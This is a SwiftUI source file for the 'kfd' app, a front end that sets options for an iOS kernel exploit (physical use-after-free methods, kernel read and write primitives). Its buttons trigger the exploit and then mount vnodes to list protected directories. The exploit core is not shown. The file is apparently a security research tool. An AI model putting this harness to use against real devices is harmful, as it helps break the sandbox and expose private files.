/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

import SwiftUI

func makeCString(from str: String) -> UnsafeMutablePointer<Int8> {
    let count = str.utf8.count + 1
    let result = UnsafeMutablePointer<Int8>.allocate(capacity: count)
    str.withCString { (baseAddress) in
        // func initialize(from: UnsafePointer<Pointee>, count: Int)
        result.initialize(from: baseAddress, count: count)
    }
    return result
}

struct ContentView: View {
    init() { }
    
    @State private var kfd: UInt64 = 0

    private var puaf_pages_options = [16, 32, 64, 128, 256, 512, 1024, 2048]
    @State private var puaf_pages_index = 7
    @State private var puaf_pages = 0

    private var puaf_method_options = ["physpuppet", "smith"]
    @State private var puaf_method = 1

    private var kread_method_options = ["kqueue_workloop_ctl", "sem_open"]
    @State private var kread_method = 1

    private var kwrite_method_options = ["dup", "sem_open"]
    @State private var kwrite_method = 1
    
    @State private var current_directory_path = "/var"
    @State private var current_directory_entries = ["(empty)"]
    
    func updateDirectoryListing(path str: String) {
        let currentDirectoryCString = makeCString(from: str)
        let mnt = mountVnode(getVnodeAtPathByChdir(currentDirectoryCString), currentDirectoryCString)
        let dirs = try? FileManager.default.contentsOfDirectory(atPath: String(cString: mnt!))
        
        current_directory_entries = dirs!
    }

    var body: some View {
        NavigationView {
            Form {
                Section {
                    Picker(selection: $puaf_pages_index, label: Text("puaf pages:")) {
                        ForEach(0 ..< puaf_pages_options.count, id: \.self) {
                            Text(String(self.puaf_pages_options[$0]))
                        }
                    }.disabled(kfd != 0)
                }
                Section {
                    Picker(selection: $puaf_method, label: Text("puaf method:")) {
                        ForEach(0 ..< puaf_method_options.count, id: \.self) {
                            Text(self.puaf_method_options[$0])
                        }
                    }.disabled(kfd != 0)
                }
                Section {
                    Picker(selection: $kread_method, label: Text("kread method:")) {
                        ForEach(0 ..< kread_method_options.count, id: \.self) {
                            Text(self.kread_method_options[$0])
                        }
                    }.disabled(kfd != 0)
                }
                Section {
                    Picker(selection: $kwrite_method, label: Text("kwrite method:")) {
                        ForEach(0 ..< kwrite_method_options.count, id: \.self) {
                            Text(self.kwrite_method_options[$0])
                        }
                    }.disabled(kfd != 0)
                }
                Section {
                    HStack {
                        Button("kopen") {
                            puaf_pages = puaf_pages_options[puaf_pages_index]
                            kfd = do_kopen(UInt64(puaf_pages), UInt64(puaf_method), UInt64(kread_method), UInt64(kwrite_method))
                            do_fun()
                            
                            let currentDirectoryCString = makeCString(from: current_directory_path)
                            let mnt = mountVnode(getVnodeAtPathByChdir(currentDirectoryCString), currentDirectoryCString)
                            let dirs = try? FileManager.default.contentsOfDirectory(atPath: String(cString: mnt!))
                            
                            current_directory_entries = dirs!
                        }.disabled(kfd != 0).frame(minWidth: 0, maxWidth: .infinity)
                        Button("kclose") {
                            do_kclose()
                            puaf_pages = 0
                            kfd = 0
                            current_directory_entries = ["(empty)"]
                        }.disabled(kfd == 0).frame(minWidth: 0, maxWidth: .infinity)
                    }.buttonStyle(.bordered)
                }.listRowBackground(Color.clear)
                if kfd != 0 {
                    Section {
                        VStack {
                            Text("Success!").foregroundColor(.green)
                            Text("Look at output in Xcode")
                        }.frame(minWidth: 0, maxWidth: .infinity)
                    }.listRowBackground(Color.clear)
                    
                    Section {
                        List {
                            ForEach(0 ..< current_directory_entries.count, id: \.self) { entry in
                                Text(self.current_directory_entries[entry])
                                    .contentShape(Rectangle())
                                    .onTapGesture(perform: {
                                        current_directory_path = current_directory_path + "/" + current_directory_entries[entry]
                                        let currentDirectoryCString = makeCString(from: current_directory_path)
                                        let mnt = mountVnode(getVnodeAtPathByChdir(currentDirectoryCString), currentDirectoryCString)
                                        let dirs = try? FileManager.default.contentsOfDirectory(atPath: String(cString: mnt!))
                                        
                                        current_directory_entries = dirs!
                                    })
                            }
                        }
                    } header: {
                        Text(String(format:"Directory listing of %@", current_directory_path))
                    }
                }
            }.navigationBarTitle(Text("kfd"), displayMode: .inline)
        }
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}
